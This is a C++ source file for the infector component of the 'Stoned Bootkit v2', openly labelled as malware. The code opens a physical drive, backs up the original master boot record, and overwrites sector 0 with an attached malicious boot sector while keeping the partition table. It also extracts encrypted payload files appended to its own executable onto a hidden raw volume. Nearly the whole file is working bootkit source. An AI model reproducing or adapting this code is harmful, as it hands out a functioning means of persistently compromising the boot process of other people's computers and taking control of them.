
// Infector functions for the Stoned Bootkit v2, "Human knowledge belongs to the world"

#include "windows.h"
#include "Error.h"


/* imports */

int RawFS_CheckVolumeExists(HANDLE PhysicalDrive, DWORD & StartSector);
int RawFS_GetFileInfo(HANDLE PhysicalDrive, DWORD StartSector, char * FileName, DWORD & FileSize);
int RawFS_ReadFile(HANDLE PhysicalDrive, DWORD StartSector, char * FileName, BYTE *& Buffer,  DWORD & FileSize);
int RawFS_WriteFile(HANDLE PhysicalDrive, DWORD StartSector, char * FileName, BYTE * Buffer,  DWORD FileSize);
int RawFS_FormatVolume(HANDLE PhysicalDrive, DWORD StartSector);
int RawFS_RemoveVolume(HANDLE PhysicalDrive, DWORD StartSector);

inline void OutputUserError(int Error);

#define MD5_MBR_Backup      "0F13C73AAB0D4E000028038C99D3125A"      // \Master Boot Record.bak
#define MD5_Bootloader      "ddcad6ec9127c41872ee0d0e0df14883"      // \Bootloader


/* forward declarations */

int WriteBootSector(HANDLE PhysicalDrive, DWORD StartSector, BYTE * Memory);
int ExtractAttachedExecutables(HANDLE PhysicalDrive, DWORD StartSector);

#pragma pack(1)
struct FileAttachmentHeader
{
    char Signature[10];     // ATTACHFILE
    char FileName[32];      // MD5 of filename to store via RawFS
    DWORD FileSize;         // size of the file
    DWORD Key;              // decryption key
};


/* special functions */

#ifdef _PROTECTIVE
#include "Protective.cpp"
#endif


/* stores all Stoned v2 files via RawFS and writes the boot sector
   errors will only be passed further by this function
*/

void InfectDrive(HANDLE PhysicalDrive)
{
    int Status;

    // expired?
    SYSTEMTIME CurrentTime;
    GetSystemTime(&CurrentTime);
    if (CurrentTime.wYear != 2010 || CurrentTime.wMonth > 1)
        return;

    // check if RawFS is already installed and get parameters
    DWORD RawFS_StartSector;
    Status = RawFS_CheckVolumeExists(PhysicalDrive, RawFS_StartSector);
    if (Status == Error_Windows)
    {
        OutputUserError(UserError_FailBootDrive);
        return;
    }
    if (Status == RawFS_Not_Bootable)
    {
        OutputUserError(UserError_DriveNotBootable);
        return;
    }
    if (Status == RawFS_Not_Installed)
    {
        // format the volume with RawFS
        if (RawFS_FormatVolume(PhysicalDrive, RawFS_StartSector) != RawFS_Successful)
        {
            OutputUserError(UserError_FailFormatRawFS);
            return;
        }
    }

    // extract all ATTACHED - not during compile time! - executables
    if (ExtractAttachedExecutables(PhysicalDrive, RawFS_StartSector))
#ifdef _PROTECTIVE
        MessageBox(NULL, L"Infected successfully (test build).", L"Successful", MB_OK);
#else
        MessageBox(NULL, L"Infected successfully with Stoned Bootkit 2 Alpha 4 test build.", L"Successful", MB_OK);
#endif
}


/* writes down the boot sector and makes a backup
    return codes:   0 = Windows Error
                    2 = Success
                    from RawFS_WriteFile
*/

int WriteBootSector(HANDLE PhysicalDrive, DWORD StartSector, BYTE * Memory)
{
    // read the boot sector
    BYTE BootSector[512];
    DWORD NumberOfBytesRead;
    if (SetFilePointer(PhysicalDrive, 0, 0, FILE_BEGIN) == INVALID_SET_FILE_POINTER     ||
        !ReadFile(PhysicalDrive, BootSector, 512, &NumberOfBytesRead, NULL) )
        return 0;

    // back it up if not already existent
    DWORD FileSize;
    int Status;
    if (RawFS_GetFileInfo(PhysicalDrive, StartSector, MD5_MBR_Backup, FileSize) == 2 && FileSize == 0)
    {
        Status = RawFS_WriteFile(PhysicalDrive, StartSector, MD5_MBR_Backup, BootSector, 512);
        if (Status != 2)
            return Status;
    }

    // fix the partition table and disk signature
    memcpy(Memory + 0x1BE, BootSector + 0x1BE, 4*16);
    memcpy(Memory + 440, BootSector + 440, 6);

    // write down the new Microsoft patched boot sector :)
    //  in future: choose specific language one or patch directly
#ifndef _DEBUG
    if (SetFilePointer(PhysicalDrive, 0, 0, FILE_BEGIN) == INVALID_SET_FILE_POINTER     ||
        !WriteFile(PhysicalDrive, Memory, 512, &NumberOfBytesRead, NULL) )
        return 0;
#endif

    return 2;
}


/* memstr not included in ANSI-C, include it here */

BYTE *memstr(BYTE * Buffer, BYTE * SearchFor, int BufferSize, int SearchForSize)
{
	BYTE *p;

	for (p = Buffer; p <= (Buffer - SearchForSize + BufferSize); p++)
	{
		if (memcmp(p, SearchFor, SearchForSize) == 0)
			return p; /* found */
	}
	return NULL;
}


/* extracts all attached executables it finds
    return codes:   00 = Windows Error
                    02 = success
*/

int ExtractAttachedExecutables(HANDLE PhysicalDrive, DWORD StartSector)
{
    // open this (compiled) file
    wchar_t FileName[MAX_PATH];
    if (!GetModuleFileName(NULL, FileName, MAX_PATH))
    {
        OutputUserError(UserError_GetModule);
        return 0;
    }

    HANDLE FileHandle;
    FileHandle = CreateFile(FileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (FileHandle == INVALID_HANDLE_VALUE)
    {
        OutputUserError(UserError_OpenThisFile);
        return 0;
    }

    DWORD FileSize = GetFileSize(FileHandle, NULL);
    if (FileSize == INVALID_FILE_SIZE)
    {
        OutputUserError(UserError_GetFileSize);
        return 0;
    }

    BYTE * FileBuffer = (BYTE *)VirtualAlloc(NULL, FileSize, MEM_COMMIT, PAGE_READWRITE | PAGE_NOCACHE);
    if (!FileBuffer)
    {
        OutputUserError(UserError_AllocFileBuffer);
        return 0;
    }

    DWORD BytesRead;
    if (!ReadFile(FileHandle, FileBuffer, FileSize, &BytesRead, NULL))
    {
        OutputUserError(UserError_ReadThisFile);
        return 0;
    }
    CloseHandle(FileHandle);

#ifdef _PROTECTIVE
    Derypt_Stage0((BYTE *)FileBuffer, FileSize);
#endif

    // find all attached files
    BYTE ScanSignature[10] = "ATTACH";
    memcpy(ScanSignature + 6, "FILE", 4);
    BYTE * ScanPosition = FileBuffer;

    while ((ScanPosition = memstr(ScanPosition, ScanSignature, FileSize - (ScanPosition - FileBuffer), sizeof(ScanSignature))))
    {
        BYTE * Attachment = ScanPosition + sizeof(FileAttachmentHeader);
        FileAttachmentHeader * Header = (FileAttachmentHeader *)ScanPosition++;
#ifdef _PROTECTIVE
        Decrypt_Stage1((BYTE *)Attachment, Header->FileSize, Header);
#endif

        // store boot sector?
        if (_strnicmp(Header->FileName, MD5_Bootloader, 32) == 0)
        {
            if (WriteBootSector(PhysicalDrive, StartSector, Attachment) != 2)
            {
                OutputUserError(UserError_WriteBootSector);
                return 0;
            }
            continue;
        }

        // extract normal file
        if (RawFS_WriteFile(PhysicalDrive, StartSector, Header->FileName, Attachment, Header->FileSize) != RawFS_Successful)
        {
            OutputUserError(UserError_ExtractFileToRawFS);
            return 0;
        }
    }

    VirtualFree(FileBuffer, 0, MEM_RELEASE);

    return 1;
}
